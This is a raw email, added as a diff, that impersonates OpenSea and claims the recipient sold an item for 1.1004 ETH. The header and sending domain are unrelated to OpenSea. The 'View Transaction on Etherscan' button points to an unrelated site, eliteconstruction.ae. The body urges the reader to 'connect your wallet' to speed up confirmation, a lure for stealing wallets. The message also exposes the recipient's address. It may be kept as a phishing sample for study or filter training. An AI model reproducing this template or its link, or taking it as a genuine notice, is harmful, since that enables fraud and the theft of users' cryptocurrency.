@@ -1,0 +1,339 @@
+Delivered-To: amareswar13724@gmail.com
+Received: by 2002:a05:6638:c4f:b0:5c6:320b:b7a4 with SMTP id g15csp3417781jal;
+        Wed, 24 Dec 2025 07:53:24 -0800 (PST)
+X-Google-Smtp-Source: AGHT+IGjcnJwUNrXk020Z0ZHcYTsYwfPsR20PWOClTKqgjJUbk2Eemz5QAFhK1K1W+aZ5zRPAI/R
+X-Received: by 2002:a5d:584e:0:b0:430:f622:8cca with SMTP id ffacd0b85a97d-4324e511553mr21077572f8f.56.1766591604584;
+        Wed, 24 Dec 2025 07:53:24 -0800 (PST)
+ARC-Seal: i=1; a=rsa-sha256; t=1766591604; cv=none;
+        d=google.com; s=arc-20240605;
+        b=kUYvoyZ0i0VBP/xYy9+3Dba0YEP+GlXrI4yupKtZuo+U+0fjMdfDe9OWmjq9zh6eVA
+         l9Jkbra/CVxHM7tBBIhRXnlEePD4Hkro2Lhd4XeOKsndngfoAIttX8ZbtaX94TJxb87f
+         kYIGltZ8T0cu2aEH1z/JL7cZqxCwePpe13npZgyGpmRkJPi88mOGPQvC781MOIrSCfaq
+         aZOLPsouKl2vbw17IW0+oW9zwPbhXPniXaW3ZJ5uVi/SngwLgzOttjllY5WvBtLMFRaF
+         Hk+HYabblPXKKULEzJp2OLHjQ5Yyg9u/kcOhl98SZAN2knxnV693b9XpG9TA5fsXmoOd
+         xolA==
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
+        h=feedback-id:message-id:date:organization:mime-version:to:subject
+         :from:dkim-signature:dkim-signature;
+        bh=vyhrFQFdVxSN+yvSuIq577les8Moe59Mo1lG7ORnVuY=;
+        fh=kn5FOTmyfeCapHy1aD6uWiv/XwWQa8rdJlVzogJ66e0=;
+        b=RxWioziOcx4fiEy8DCDACndPyMRgJmWd01nlHpsojNgKBFqQHU7fw9y0Hq7VHvDVV7
+         S6SSjjKgnAcWA8W1Bgyvyl6lGIGaj0ViPWOPud4cqOm76LFgDkEvgl1pq1+2nySBABcm
+         SNdik4gor5+iReJNdkan7kMzsLmSibMzSiWqbcBNHaFy7iOlSwGEXgLFnWvZfg6kUKrG
+         YUx4SAgUdV5RvVgOqSGC2cbSzIC4eEI/NAdNyfi6nNjwVcfDLMa6dX95STx5oHfPbYiI
+         VDzacB0f+CI5Sa1YlP+h8dlcOOPtvJSoEDTQP8T2qDKWM9H6VnVUcKWO3v3nZBIPAwoP
+         8nuA==;
+        dara=google.com
+ARC-Authentication-Results: i=1; mx.google.com;
+       dkim=pass header.i=@vienacapellanes.com header.s=3omcq2arvbcbyvqa5ajgl7j47srfy5sj header.b=BvvuNj4G;
+       dkim=pass header.i=@amazonses.com header.s=ihchhvubuqgjsxyuhssfvqohv7z3u4hn header.b=bC7Oy8iL;
+       spf=pass (google.com: domain of 0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com designates 54.240.3.23 as permitted sender) smtp.mailfrom=0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=vienacapellanes.com
+Return-Path: <0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com>
+Received: from a3-23.smtp-out.eu-west-1.amazonses.com (a3-23.smtp-out.eu-west-1.amazonses.com. [54.240.3.23])
+        by mx.google.com with ESMTPS id ffacd0b85a97d-4325da75b0asi16348514f8f.159.2025.12.24.07.53.24
+        for <amareswar13724@gmail.com>
+        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
+        Wed, 24 Dec 2025 07:53:24 -0800 (PST)
+Received-SPF: pass (google.com: domain of 0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com designates 54.240.3.23 as permitted sender) client-ip=54.240.3.23;
+Authentication-Results: mx.google.com;
+       dkim=pass header.i=@vienacapellanes.com header.s=3omcq2arvbcbyvqa5ajgl7j47srfy5sj header.b=BvvuNj4G;
+       dkim=pass header.i=@amazonses.com header.s=ihchhvubuqgjsxyuhssfvqohv7z3u4hn header.b=bC7Oy8iL;
+       spf=pass (google.com: domain of 0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com designates 54.240.3.23 as permitted sender) smtp.mailfrom=0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com;
+       dmarc=pass (p=NONE sp=NONE dis=NONE) header.from=vienacapellanes.com
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+	s=3omcq2arvbcbyvqa5ajgl7j47srfy5sj; d=vienacapellanes.com;
+	t=1766591604;
+	h=From:Subject:To:Content-Type:MIME-Version:Date:Message-ID;
+	bh=uh+ItsLekY5JfAq0wKNomxqja0YZKSHBP3lHQNjyEPI=;
+	b=BvvuNj4Gbs+mv1Olw6B12VkOQapclmV2XF3kanZv6TdtDSzJd38V7gyeelQml1Iu
+	3jdAHFOr8dDPRN99hx66ALfBlZh9nRpJHqmrZvwiboM+aoj1U83lcdAzVCsfa3prZdx
+	L20YwrlrJUlg9fnbNv6z1MFR/GuJjdkqNmwOzN6w=
+DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/simple;
+	s=ihchhvubuqgjsxyuhssfvqohv7z3u4hn; d=amazonses.com; t=1766591604;
+	h=From:Subject:To:Content-Type:MIME-Version:Date:Message-ID:Feedback-ID;
+	bh=uh+ItsLekY5JfAq0wKNomxqja0YZKSHBP3lHQNjyEPI=;
+	b=bC7Oy8iLFE8fx7xzvDceQ6MayAcDhOyqXZuLI0dmwBze7Yia4HJw1ZJBpJ8qmtnC
+	br1FJZgdGv0u2FvW9xUHeXhzhjdCLxUb+hyu+tHYqpXfIiNaBU+dDYCLy0OuJxjhKor
+	Ee4ofZDwjcsclIIStSIYNfWclt+oWY6YfEsLh8sM=
+From: info <my@vienacapellanes.com>
+Subject: You have a pending transaction that requires your attention! #33422!
+To: amareswar13724 <amareswar13724@gmail.com>
+Content-Type: multipart/alternative; boundary="NJVAy1CCnO5MkGNLDXRaMeyR=_jupiY02i"
+MIME-Version: 1.0
+Organization: Opensea
+Date: Wed, 24 Dec 2025 15:53:24 +0000
+Message-ID: <0102019b5110a5b9-c48327a5-eb62-4782-9713-75af1a88b08b-000000@eu-west-1.amazonses.com>
+Feedback-ID: ::1.eu-west-1.AzDgQmF1jRsD7DJ3APG6WBE8jeOnY60592dYohNWmag=:AmazonSES
+X-SES-Outgoing: 2025.12.24-54.240.3.23
+
+This is a multi-part message in MIME format
+
+--NJVAy1CCnO5MkGNLDXRaMeyR=_jupiY02i
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
+
+
+
+=20
+
+
+
+
+You have successfully sold your item!=20
+
+
+Congratulations! You successfully sold item #3677482 for 1.1004 ETH us=
+ing OpenSea.=20
+
+
+ =20
+View Transaction on Etherscan =20
+
+
+
+=20
+
+
+=20
+
+
+Want to receive funds faster?
+
+Connect your wallet to track this transaction in real-time and speed u=
+p confirmation if needed.=20
+
+
+Get the OpenSea app=20
+
+
+
+
+
+=C2=A92018 - 2025 OpenSea=20
+
+=20
+
+
+=20
+
+
+--NJVAy1CCnO5MkGNLDXRaMeyR=_jupiY02i
+Content-Type: text/html; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+Content-Disposition: inline
+
+<html lang=3D"en"><head>
+  <meta charset=3D"utf-8">
+  <title></title>
+ =20
+ =20
+</head>
+<body>
+  <table width=3D"540" align=3D"center" role=3D"presentation" style=3D=
+"width: 540px; color: rgb(80, 0, 80); font-family: Inter, Helvetica, A=
+rial; font-size: small; background-color: rgb(229, 232, 235);" border=3D=
+"0" cellspacing=3D"0" cellpadding=3D"0">
+    <tbody>
+      <tr>
+        <td align=3D"center" valign=3D"top" style=3D"margin: 0px; back=
+ground-color: rgb(254, 255, 255);">
+          <table width=3D"460" role=3D"presentation" style=3D"width: 4=
+60px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+            <tbody>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px;">
+                  <img width=3D"70" class=3D"CToWUd" style=3D"width: 7=
+0px; display: block; max-width: 70px;" alt=3D"OpenSea" src=3D"https://=
+d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/669d5713-9b6a-4=
+6bb-bd7e-c542cff6dd6a/79321cd9dcd645da85fea8d0a49bebde/editor_images/H=
+eader_logo.png" border=3D"0" data-bit=3D"iit">
+                </td>
+              </tr>
+              <tr>
+                <td height=3D"20" style=3D"margin: 0px; height: 20px; =
+line-height: 0; font-size: 0px;">&nbsp;</td>
+              </tr>
+            </tbody>
+          </table>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+
+  <table width=3D"540" align=3D"center" role=3D"presentation" style=3D=
+"width: 540px; color: rgb(80, 0, 80); font-family: Inter, Helvetica, A=
+rial; font-size: small; border-collapse: collapse !important; table-la=
+yout: fixed; background-color: rgb(254, 255, 255);" bgcolor=3D"rgb(254=
+,255,255)" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+    <tbody>
+      <tr>
+        <td align=3D"center" valign=3D"top" style=3D"margin: 0px; bord=
+er-collapse: collapse; box-sizing: border-box !important;">
+          <table width=3D"460" role=3D"presentation" style=3D"width: 4=
+60px; border-collapse: collapse !important; table-layout: fixed;" bord=
+er=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+            <tbody>
+              <tr>
+                <td align=3D"left" valign=3D"top" style=3D"margin: 0px=
+; padding: 25px 0px 0px; border-collapse: collapse; box-sizing: border=
+-box !important;">
+                  <h1 style=3D"margin: 0px; padding: 0px; color: rgb(1=
+7, 17, 17); line-height: 32px; font-family: Poppins, Helvetica, Arial;=
+ font-size: 24px;">
+                    You have successfully sold your&nbsp;item!
+                  </h1>
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"left" valign=3D"top" style=3D"margin: 0px=
+; padding: 15px 0px 0px; border-collapse: collapse; box-sizing: border=
+-box !important;">
+                  <p style=3D"margin: 0px; padding: 0px; color: rgb(17=
+, 17, 17); line-height: 28px; font-size: 18px;">
+                    Congratulations! You successfully sold&nbsp;<stron=
+g>item #3677482</strong>&nbsp;for&nbsp;<strong>1.1004 ETH</strong>&nbs=
+p;using OpenSea.
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px; padding: 25px 0px 0px; border-collapse: collapse; box-sizing: bord=
+er-box !important;">
+                  <br>&nbsp;
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"left" valign=3D"top" style=3D"margin: 0px=
+; padding: 25px 0px 0px; border-collapse: collapse; box-sizing: border=
+-box !important;">
+                  <a style=3D"border-radius: 12px; border: 1px solid r=
+gb(255, 255, 255); border-image: none; width: 460px; text-align: cente=
+r; color: rgb(255, 255, 255); line-height: 55px; font-size: 18px; font=
+-weight: 600; text-decoration: none; display: inline-block; border-col=
+lapse: collapse; box-sizing: border-box !important; background-color: =
+rgb(32, 129, 226);" href=3D"https://eliteconstruction.ae/ssl/?id=3D057=
+0" target=3D"_blank">
+                    View Transaction on Etherscan
+                  </a>
+                </td>
+              </tr>
+            </tbody>
+          </table>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+
+  <table width=3D"540" align=3D"center" role=3D"presentation" style=3D=
+"width: 540px; color: rgb(80, 0, 80); font-family: Inter, Helvetica, A=
+rial; font-size: small; background-color: rgb(229, 232, 235);" border=3D=
+"0" cellspacing=3D"0" cellpadding=3D"0">
+    <tbody>
+      <tr>
+        <td align=3D"center" valign=3D"top" style=3D"margin: 0px; back=
+ground-color: rgb(254, 255, 255);">
+          <table width=3D"460" role=3D"presentation" style=3D"width: 4=
+60px;" border=3D"0" cellspacing=3D"0" cellpadding=3D"0">
+            <tbody>
+              <tr>
+                <td height=3D"40" style=3D"margin: 0px; height: 40px; =
+line-height: 0; font-size: 0px;">&nbsp;</td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px;">
+                  <img width=3D"36" class=3D"CToWUd" style=3D"width: 3=
+6px; display: block; max-width: 36px;" alt=3D"OpenSea" src=3D"https://=
+d15k2d11r6t6rl.cloudfront.net/public/users/Integrators/669d5713-9b6a-4=
+6bb-bd7e-c542cff6dd6a/79321cd9dcd645da85fea8d0a49bebde/editor_images/F=
+ooter_logo.png" border=3D"0" data-bit=3D"iit">
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px; padding-top: 15px;">
+                  <p style=3D"margin: 0px; color: rgb(17, 17, 17); lin=
+e-height: 18px; font-size: 12px;">&nbsp;</p>
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px; padding-top: 15px;">
+				<h4>Want to receive funds faster?</h4>
+                  <p style=3D"margin: 0px; color: rgb(17, 17, 17); lin=
+e-height: 18px; font-size: 12px;">
+                    Connect your wallet to track this transaction in r=
+eal-time and speed up confirmation if needed.
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px; padding-top: 35px;">
+                  <p style=3D"margin: 0px; color: rgb(17, 17, 17); lin=
+e-height: 18px; font-size: 12px; font-weight: 700;">
+                    <strong>Get the OpenSea app</strong>
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px; padding-top: 15px;">
+                  <table role=3D"presentation" border=3D"0" cellspacin=
+g=3D"0" cellpadding=3D"0">
+                    <tbody>
+                      <tr>
+                        <td align=3D"left" valign=3D"top" style=3D"mar=
+gin: 0px; padding-right: 25px;">
+                          <img width=3D"120" class=3D"CToWUd" style=3D=
+"width: 120px; text-align: center; display: block; max-width: 120px;" =
+alt=3D"iOS App Store" src=3D"https://d15k2d11r6t6rl.cloudfront.net/pub=
+lic/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd=
+645da85fea8d0a49bebde/editor_images/AppStore.png" border=3D"0" data-bi=
+t=3D"iit">
+                        </td>
+                        <td align=3D"left" valign=3D"top" style=3D"mar=
+gin: 0px;">
+                          <img width=3D"135" class=3D"CToWUd" style=3D=
+"width: 135px; text-align: center; display: block; max-width: 135px;" =
+alt=3D"GooglePlay" src=3D"https://d15k2d11r6t6rl.cloudfront.net/public=
+/users/Integrators/669d5713-9b6a-46bb-bd7e-c542cff6dd6a/79321cd9dcd645=
+da85fea8d0a49bebde/editor_images/GooglePlay.png" border=3D"0" data-bit=
+=3D"iit">
+                        </td>
+                      </tr>
+                    </tbody>
+                  </table>
+                </td>
+              </tr>
+              <tr>
+                <td align=3D"center" valign=3D"top" style=3D"margin: 0=
+px; padding: 25px 0px 0px;">
+                  <p style=3D"margin: 0px; color: rgb(17, 17, 17); lin=
+e-height: 18px; font-size: 12px;">
+                    =C2=A92018 - 2025 OpenSea
+                  </p>
+                </td>
+              </tr>
+              <tr>
+                <td height=3D"40" style=3D"margin: 0px; height: 40px; =
+line-height: 0; font-size: 0px;">&nbsp;</td>
+              </tr>
+            </tbody>
+          </table>
+        </td>
+      </tr>
+    </tbody>
+  </table>
+  <p>&nbsp;</p>
+
+
+</body></html>
+
+
+--NJVAy1CCnO5MkGNLDXRaMeyR=_jupiY02i--
+
